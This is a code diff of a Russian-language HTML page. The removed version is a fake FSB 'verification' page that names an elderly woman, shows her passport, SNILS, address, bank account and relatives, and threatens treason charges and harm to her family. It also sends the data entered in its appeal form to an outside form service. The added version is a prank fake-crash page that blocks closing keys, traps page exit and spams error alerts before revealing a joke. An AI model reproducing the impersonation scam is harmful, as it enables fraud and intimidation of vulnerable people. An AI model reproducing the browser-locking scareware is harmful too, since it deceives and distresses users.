@@ -1,341 +1,133 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-  <title>ФСБ РФ · Проверка данных</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #020408; color: #c0c8d4; font-family: 'Courier New', 'Segoe UI', monospace;
-      min-height: 100vh; display: flex; justify-content: center; align-items: center;
-      padding: 1.5rem;
-      background-image: 
-        radial-gradient(ellipse at 50% 0%, rgba(180,0,30,0.12) 0%, transparent 70%),
-        radial-gradient(ellipse at 50% 100%, rgba(0,20,40,0.9) 0%, transparent 70%);
-    }
-    .container { max-width: 750px; width: 100%; margin: 0 auto; }
-
-    .header {
-      text-align: center; margin-bottom: 1.5rem; padding: 1.5rem;
-      background: rgba(10,15,26,0.8); border: 1px solid #1e3040; border-radius: 12px;
-    }
-    .herb { width: 70px; height: 80px; margin: 0 auto 1rem; position: relative; }
-    .herb .eagle {
-      width: 50px; height: 60px; background: #1a1a2e; border: 2px solid #c0a060;
-      border-radius: 50% 50% 40% 40%; margin: 0 auto; position: relative;
-      box-shadow: 0 0 20px rgba(192,160,96,0.3);
-    }
-    .herb .eagle::before {
-      content: "ФСБ"; position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%,-50%); color: #c0a060;
-      font-size: 0.6rem; font-weight: 900; letter-spacing: 2px;
-    }
-    .herb .shield {
-      width: 30px; height: 35px; background: #c41230;
-      border-radius: 0 0 50% 50%; margin: -5px auto 0; position: relative;
-    }
-    .herb .shield::after {
-      content: "РФ"; position: absolute; top: 40%; left: 50%;
-      transform: translate(-50%,-50%); color: #fff; font-size: 0.5rem; font-weight: 900;
-    }
-    .header h1 {
-      font-size: 1.3rem; font-weight: 700; color: #e0e8f0;
-      letter-spacing: 3px; text-transform: uppercase; margin-bottom: 0.3rem;
-    }
-    .header .subtitle { font-size: 0.7rem; color: #7a8ba6; letter-spacing: 2px; }
-
-    .alert-header {
-      text-align: center; margin-bottom: 1.5rem; padding: 1rem;
-      background: rgba(196,18,48,0.1); border: 2px solid #c41230;
-      border-radius: 10px; animation: alertHeaderPulse 2s infinite;
-    }
-    .alert-header h2 {
-      font-size: 1rem; font-weight: 900; color: #ff2d2d;
-      letter-spacing: 2px; text-transform: uppercase;
-    }
-    .alert-header .sub { font-size: 0.65rem; color: #f0506a; margin-top: 0.3rem; }
-
-    .risk-card { background: #0a101c; border: 1px solid #4a1525; border-radius: 10px; padding: 1rem; margin-bottom: 1rem; }
-    .risk-title { font-size: 0.65rem; color: #f0506a; letter-spacing: 2px; margin-bottom: 0.8rem; text-transform: uppercase; text-align: center; }
-    .risk-row { display: flex; align-items: center; margin-bottom: 0.6rem; gap: 0.5rem; }
-    .risk-label { width: 100px; font-size: 0.6rem; color: #6b7d95; text-align: right; }
-    .risk-bar { flex: 1; height: 8px; background: #1a2540; border-radius: 4px; overflow: hidden; }
-    .risk-fill { height: 100%; border-radius: 4px; }
-    .risk-fill.red { background: linear-gradient(90deg, #c41230, #ff4d4d); width: 92%; }
-    .risk-fill.orange { background: linear-gradient(90deg, #c47020, #f0a040); width: 78%; }
-    .risk-fill.yellow { background: linear-gradient(90deg, #c0a020, #f0d040); width: 65%; }
-    .risk-value { width: 35px; font-size: 0.6rem; color: #d4dce8; font-weight: 700; text-align: left; }
-
-    .card {
-      background: #0a101c; border: 1px solid #1e3040; border-radius: 10px;
-      padding: 1.2rem; margin-bottom: 1rem;
-    }
-    .card.danger { border-color: #4a1525; box-shadow: 0 0 25px rgba(196,18,48,0.15); }
-    .card-title {
-      font-size: 0.65rem; color: #7a8ba6; letter-spacing: 2px;
-      margin-bottom: 1rem; text-transform: uppercase;
-      display: flex; align-items: center; gap: 0.5rem;
-    }
-    .dot { width: 8px; height: 8px; border-radius: 50%; animation: dotPulse 1.5s infinite; }
-    .dot.red { background: #c41230; box-shadow: 0 0 10px rgba(196,18,48,0.5); }
-
-    .table { width: 100%; border-collapse: collapse; }
-    .table td {
-      padding: 0.5rem 0.3rem; border-bottom: 1px solid #1a2540;
-      font-size: 0.7rem; vertical-align: top;
-    }
-    .table td:first-child { color: #6b7d95; width: 40%; }
-    .table td:last-child { color: #d4dce8; font-weight: 600; text-align: right; }
-
-    .badge {
-      display: inline-block; padding: 0.2rem 0.5rem; border-radius: 3px;
-      font-size: 0.6rem; font-weight: 700; letter-spacing: 1px;
-    }
-    .badge-red { background: #1a0a0f; color: #f0506a; border: 1px solid #4a1525; }
-    .badge-yellow { background: #1a1405; color: #f0c040; border: 1px solid #4a3a15; }
-
-    .family-list { display: flex; flex-direction: column; gap: 0.5rem; }
-    .family-item {
-      display: flex; justify-content: space-between; align-items: center;
-      padding: 0.6rem; background: #0d1320; border-radius: 6px;
-      border: 1px solid #1a2540; font-size: 0.7rem;
-    }
-    .family-item .relation { color: #6b7d95; font-size: 0.6rem; }
-    .family-item .status { color: #f0c040; font-weight: 600; font-size: 0.65rem; }
-
-    .consequences {
-      background: #0a0f1a; border: 2px solid #4a1525; border-radius: 10px;
-      padding: 1rem; margin-bottom: 1rem;
-    }
-    .consequences .cons-title {
-      font-size: 0.7rem; color: #ff2d2d; letter-spacing: 2px;
-      margin-bottom: 0.8rem; text-transform: uppercase; text-align: center;
-    }
-    .cons-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
-    .cons-list li {
-      font-size: 0.65rem; color: #c0c8d4; padding-left: 1rem; position: relative;
-    }
-    .cons-list li::before { content: "☠"; position: absolute; left: 0; color: #f0506a; font-size: 0.6rem; }
-
-    .btn-danger {
-      display: block; width: 100%; padding: 1rem;
-      background: #c41230; border: none; border-radius: 8px;
-      color: #fff; font-size: 0.85rem; font-weight: 700;
-      letter-spacing: 2px; cursor: pointer; transition: all 0.3s ease;
-      text-transform: uppercase; font-family: inherit; text-align: center;
-      text-decoration: none; animation: btnPulse 2s infinite; margin-bottom: 1rem;
-    }
-    .btn-danger:hover { background: #e01838; box-shadow: 0 0 30px rgba(196,18,48,0.5); }
-
-    .blocked-btn {
-      display: flex; align-items: center; justify-content: center; gap: 0.5rem;
-      padding: 0.7rem; background: #0d1320; border: 1px solid #2a3a50;
-      border-radius: 6px; color: #4a5a70; font-size: 0.7rem; font-weight: 600;
-      letter-spacing: 1px; text-decoration: line-through; cursor: not-allowed; opacity: 0.5;
-    }
-
-    .form-group { margin-bottom: 0.7rem; }
-    .form-group label {
-      display: block; font-size: 0.6rem; color: #7a8ba6;
-      margin-bottom: 0.3rem; letter-spacing: 1px; text-transform: uppercase;
-    }
-    .form-group input, .form-group textarea {
-      width: 100%; padding: 0.6rem; background: #0d1320;
-      border: 1px solid #2a3a50; border-radius: 5px; color: #d4dce8;
-      font-family: inherit; font-size: 0.7rem; resize: vertical;
-    }
-    .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #c41230; }
-    .form-group textarea { min-height: 100px; }
-    .btn-submit {
-      width: 100%; padding: 0.7rem; background: #1a0a0f;
-      border: 1px solid #c41230; color: #f0506a; font-weight: 600;
-      font-size: 0.75rem; letter-spacing: 1px; border-radius: 5px;
-      cursor: pointer; font-family: inherit; text-transform: uppercase;
-    }
-    .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; }
-
-    .response-box {
-      margin-top: 0.8rem; padding: 0.8rem; background: #0d1320;
-      border: 1px solid #154a25; border-radius: 6px; display: none; text-align: center;
-    }
-    .response-box.show { display: block; }
-    .response-num { font-size: 1.2rem; font-weight: 700; color: #50f070; letter-spacing: 2px; margin: 0.4rem 0; }
-
-    .footer {
-      text-align: center; margin-top: 2rem; font-size: 0.5rem;
-      color: #3a4a60; border-top: 1px solid #1a2540; padding-top: 1rem; letter-spacing: 1px;
-    }
-
-    @keyframes alertHeaderPulse {
-      0%, 100% { box-shadow: 0 0 10px rgba(196,18,48,0.3); }
-      50% { box-shadow: 0 0 30px rgba(196,18,48,0.7); }
-    }
-    @keyframes btnPulse {
-      0%, 100% { box-shadow: 0 0 10px rgba(196,18,48,0.4); }
-      50% { box-shadow: 0 0 25px rgba(196,18,48,0.8); }
-    }
-    @keyframes dotPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-
-    @media (max-width: 500px) {
-      body { padding: 0.5rem; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Системная ошибка</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000; overflow: hidden; font-family: 'Courier New', monospace;
+            cursor: none; user-select: none;
+        }
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 9999;
+        }
+        #alertBox {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: #c0c0c0; border: 3px solid #000; padding: 2rem;
+            z-index: 10000; text-align: center; min-width: 400px;
+            box-shadow: 10px 10px 0px rgba(0,0,0,0.5);
+        }
+        #alertBox h1 { font-size: 1.5rem; color: #000; margin-bottom: 1rem; }
+        #alertBox p { font-size: 1rem; color: #000; margin-bottom: 1.5rem; }
+        #alertBox button {
+            background: #000080; color: #fff; border: 2px solid #000;
+            padding: 0.5rem 1.5rem; font-size: 1rem; cursor: pointer;
+            font-family: 'Courier New', monospace;
+        }
+        #glitch {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 9998; pointer-events: none;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(255,0,0,0.1) 0px,
+                rgba(0,255,0,0.1) 2px,
+                rgba(0,0,255,0.1) 4px,
+                rgba(255,255,0,0.1) 6px,
+                rgba(255,0,255,0.1) 8px
+            );
+            animation: glitchAnim 0.3s infinite;
+        }
+        @keyframes glitchAnim {
+            0% { transform: translate(0,0); }
+            25% { transform: translate(-5px,3px); }
+            50% { transform: translate(5px,-3px); }
+            75% { transform: translate(-3px,-5px); }
+            100% { transform: translate(3px,5px); }
+        }
+        #bsod {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #0000aa; color: #fff; z-index: 10001; padding: 3rem;
+            font-family: 'Courier New', monospace; font-size: 1rem;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-
-    <!-- ШАПКА -->
-    <div class="header">
-      <div class="herb">
-        <div class="eagle"></div>
-        <div class="shield"></div>
-      </div>
-      <h1>Федеральная Служба Безопасности</h1>
-      <p class="subtitle">Управление по борьбе с финансированием терроризма</p>
+    <div id="glitch"></div>
+    <div id="overlay"></div>
+    <div id="alertBox">
+        <h1>⚠ КРИТИЧЕСКАЯ ОШИБКА</h1>
+        <p>Обнаружена подозрительная активность.<br>IP-адрес заблокирован.</p>
+        <button onclick="showBSOD()">OK</button>
     </div>
 
-    <!-- КРАСНЫЙ ЗАГОЛОВОК -->
-    <div class="alert-header">
-      <h2>⚠ Проверяемое лицо</h2>
-      <div class="sub">Статья 205.1 УК РФ · Статья 275 УК РФ · Государственная измена</div>
+    <div id="bsod">
+        <p style="font-size:1.5rem; margin-bottom:1rem;">*** STOP: 0x0000007B</p>
+        <p>FATAL_SYSTEM_ERROR</p>
+        <p>Ваш компьютер заблокирован в целях безопасности.</p>
+        <p>Код ошибки: 0xDEADBEEF</p>
+        <p>Обратитесь к системному администратору.</p>
+        <p style="margin-top:2rem;">_</p>
     </div>
 
-    <!-- ШКАЛЫ РИСКОВ -->
-    <div class="risk-card">
-      <div class="risk-title">📊 Уровень угрозы</div>
-      <div class="risk-row">
-        <span class="risk-label">Тюремный срок</span>
-        <div class="risk-bar"><div class="risk-fill red"></div></div>
-        <span class="risk-value">92%</span>
-      </div>
-      <div class="risk-row">
-        <span class="risk-label">Потеря средств</span>
-        <div class="risk-bar"><div class="risk-fill orange"></div></div>
-        <span class="risk-value">78%</span>
-      </div>
-      <div class="risk-row">
-        <span class="risk-label">Угроза семье</span>
-        <div class="risk-bar"><div class="risk-fill yellow"></div></div>
-        <span class="risk-value">65%</span>
-      </div>
-    </div>
+    <script>
+        let clickCount = 0;
+        
+        function showBSOD() {
+            clickCount++;
+            if (clickCount >= 3) {
+                document.getElementById('alertBox').style.display = 'none';
+                document.getElementById('bsod').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('bsod').style.display = 'none';
+                    document.getElementById('alertBox').style.display = 'block';
+                    clickCount = 0;
+                }, 5000);
+            }
+        }
 
-    <!-- КАРТОЧКА ОБЪЕКТА -->
-    <div class="card danger">
-      <div class="card-title"><span class="dot red"></span> Карточка объекта проверки</div>
-      <table class="table">
-        <tr><td>ФИО</td><td>Шишова Ирина Ивановна</td></tr>
-        <tr><td>Дата рождения</td><td>06.09.1953 (71 год)</td></tr>
-        <tr><td>Паспорт</td><td>4514 123456</td></tr>
-        <tr><td>СНИЛС</td><td>123-456-789 01</td></tr>
-        <tr><td>Адрес</td><td>г. Москва, пр. Напольный, д. 6, кв. 26</td></tr>
-        <tr><td>Статус</td><td><span class="badge badge-red">ПРОВЕРЯЕМОЕ ЛИЦО</span></td></tr>
-      </table>
-    </div>
+        document.getElementById('alertBox').addEventListener('click', function(e) {
+            e.stopPropagation();
+        });
 
-    <!-- КОНТАКТНЫЕ ЛИЦА -->
-    <div class="card danger">
-      <div class="card-title"><span class="dot red"></span> Контактные лица под угрозой проверки</div>
-      <div class="family-list">
-        <div class="family-item">
-          <div><strong>Вельмизов Виктор Владимирович</strong><div class="relation">Супруг · 19.08.1957</div></div>
-          <span class="status">⚠ Контактное лицо</span>
-        </div>
-        <div class="family-item">
-          <div><strong>Иванова Анна Викторовна</strong><div class="relation">Дочь · 12.03.1980</div></div>
-          <span class="status">⚠ Контактное лицо</span>
-        </div>
-        <div class="family-item">
-          <div><strong>Иванов Пётр Сергеевич</strong><div class="relation">Зять · 05.07.1978</div></div>
-          <span class="status">⚠ Контактное лицо</span>
-        </div>
-        <div class="family-item">
-          <div><strong>Иванов Артём Петрович</strong><div class="relation">Внук · 14 лет</div></div>
-          <span class="status">⚠ Контактное лицо</span>
-        </div>
-      </div>
-    </div>
+        // Запрет на закрытие через Esc и правый клик
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' || e.key === 'F4' || (e.ctrlKey && e.key === 'w')) {
+                e.preventDefault();
+                alert('Действие заблокировано системой безопасности');
+            }
+        });
 
-    <!-- ФИНАНСОВЫЕ ОПЕРАЦИИ -->
-    <div class="card danger">
-      <div class="card-title"><span class="dot red"></span> Зафиксированные финансовые операции</div>
-      <table class="table">
-        <tr><td>Банк</td><td>АЛЬФА-БАНК</td></tr>
-        <tr><td>Счёт</td><td>40817 810 3 0000 1234567</td></tr>
-        <tr><td>Зачисление от Лаптуховой Е.А.</td><td style="color:#f0506a;">+ 500 000 ₽</td></tr>
-        <tr><td>Зачисление от Лаптуховой Е.А.</td><td style="color:#f0506a;">+ 450 000 ₽</td></tr>
-        <tr><td>Перевод на Терновского Р.Л.</td><td><span class="badge badge-yellow">- 500 000 ₽ (приостановлен)</span></td></tr>
-      </table>
-    </div>
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
 
-    <!-- ДОВЕРЕННОСТЬ -->
-    <div class="card danger">
-      <div class="card-title"><span class="dot red"></span> Доверенность</div>
-      <table class="table">
-        <tr><td>Номер доверенности</td><td>№ 027-697-475-2</td></tr>
-        <tr><td>Оформлена на</td><td>Терновского Романа Леонидовича</td></tr>
-        <tr><td>Статус лица</td><td><span class="badge badge-red">ЭКСТРЕМИСТ · В РОЗЫСКЕ</span></td></tr>
-        <tr><td>Цель</td><td>Распоряжение всеми счетами, открытие новых карт, зачисление и снятие средств</td></tr>
-        <tr><td>Заверена</td><td>Сотрудником коммерческого банка</td></tr>
-        <tr><td>Статус доверенности</td><td><span class="badge badge-red">АКТИВНА</span></td></tr>
-      </table>
-    </div>
+        // Попытка закрыть окно
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = 'Вы уверены? Система заблокирована.';
+            return e.returnValue;
+        });
 
-    <!-- ЧЁРНЫЙ СПИСОК -->
-    <div class="consequences">
-      <div class="cons-title">☠ ЧТО БУДЕТ, ЕСЛИ НЕ РЕШИТЬ</div>
-      <ul class="cons-list">
-        <li>Автоматическая блокировка всех счетов</li>
-        <li>Арест имущества (квартира, дача)</li>
-        <li>Передача материалов в Генпрокуратуру</li>
-        <li>Уголовное дело по ст. 205.1 и 275 УК РФ (до 20 лет)</li>
-        <li>Допросы всех членов семьи</li>
-        <li>Письма ФСБ на места работы родственников</li>
-      </ul>
-    </div>
+        // Каждые 2 секунды - новое окно с ошибкой
+        let spamInterval;
+        setTimeout(() => {
+            spamInterval = setInterval(() => {
+                alert('Ошибка 0x' + Math.random().toString(16).slice(2,10).toUpperCase() + '\nСистема не отвечает.');
+            }, 2000);
+        }, 10000);
 
-    <!-- КНОПКА -->
-    <a href="#appealForm" class="btn-danger">⚠ ЗАРЕГИСТРИРОВАТЬ СВОЁ ОБРАЩЕНИЕ</a>
-
-    <!-- ЗАБЛОКИРОВАННАЯ КНОПКА -->
-    <div class="blocked-btn"><span>🔒</span> Аннулировать доверенность (ожидание ФСБ)</div>
-
-    <!-- ФОРМА ОБРАЩЕНИЯ -->
-    <div class="card" id="appealForm">
-      <div class="card-title">📩 Обращение в ФСБ</div>
-      <form id="fsbForm">
-        <div class="form-group"><label>Фамилия, Имя, Отчество</label><input type="text" name="fio" placeholder="Иванов Иван Иванович" required></div>
-        <div class="form-group"><label>Дата рождения</label><input type="text" name="birthdate" placeholder="01.01.1950" required></div>
-        <div class="form-group"><label>Текст обращения</label><textarea name="message" placeholder="Опишите вашу ситуацию..."></textarea></div>
-        <button type="submit" class="btn-submit" id="submitBtn">📤 Отправить обращение</button>
-      </form>
-      <div class="response-box" id="responseBox">
-        <p style="color:#7a8ba6;">✅ Обращение зарегистрировано</p>
-        <div class="response-num" id="responseNumber"></div>
-        <p style="font-size:0.6rem; color:#f0c040;">⏳ Ожидает проверки ФСБ</p>
-      </div>
-    </div>
-
-    <div class="footer">
-      Система оперативного контроля ФСБ России · Версия 4.8.2<br>
-      Несанкционированный доступ преследуется по ст. 272, 275, 310 УК РФ
-    </div>
-
-  </div>
-
-  <script>
-    document.getElementById('fsbForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const btn = document.getElementById('submitBtn');
-      btn.disabled = true; btn.textContent = '⏳ Отправка...';
-      const num = 'ФСБ-' + Math.floor(Math.random() * 900000 + 100000) + '-' + Math.floor(Math.random() * 90 + 10);
-      document.getElementById('responseNumber').textContent = num;
-      document.getElementById('responseBox').classList.add('show');
-      const fd = new FormData(this);
-      try { await fetch('https://formspree.io/f/maqzpror', { method: 'POST', body: fd, headers: { 'Accept': 'application/json' } }); } catch(e) {}
-      btn.textContent = '✅ Отправлено';
-    });
-  </script>
+        // Автоматическое снятие через 5 минут
+        setTimeout(() => {
+            clearInterval(spamInterval);
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('glitch').style.display = 'none';
+            document.getElementById('alertBox').style.display = 'none';
+            document.getElementById('bsod').style.display = 'none';
+            document.body.style.background = '#fff';
+            document.body.innerHTML = '<h1 style="text-align:center;margin-top:20%;font-family:Arial;">Шутка! Твой компьютер в порядке.</h1>';
+        }, 300000);
+    </script>
 </body>
 </html>
